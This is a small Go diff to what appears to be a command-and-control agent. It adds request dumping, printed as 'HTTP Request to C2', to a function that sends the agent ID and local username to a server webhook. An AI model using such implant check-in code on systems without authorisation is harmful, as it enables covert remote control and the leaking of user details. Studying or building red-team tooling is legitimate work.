@@ -6,6 +6,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
+	"net/http/httputil"
 	"strings"
 )
 
@@ -27,7 +28,7 @@ type NotifyMsg struct {
 func (agent *Agent) notifyServer(webhookURL string, serverURL string) error {
 
 	notifyMsg := NotifyMsg{
-		Random:   random(), 
+		Random:   random(),
 		AgentID:  agent.agentID,
 		Username: agent.username,
 	}
@@ -142,6 +143,13 @@ func postToWebhook(bodyBytes []byte, webhookURL string) error {
 	}
 
 	req.Header.Set("Content-Type", "application/json")
+
+	// add request debug statement
+	dump, err := httputil.DumpRequestOut(req, true)
+	if err != nil {
+		return fmt.Errorf("failed to dump request: %w", err)
+	}
+	fmt.Println("HTTP Request to C2:\n", string(dump))
 
 	client := &http.Client{}
 	resp, err := client.Do(req)
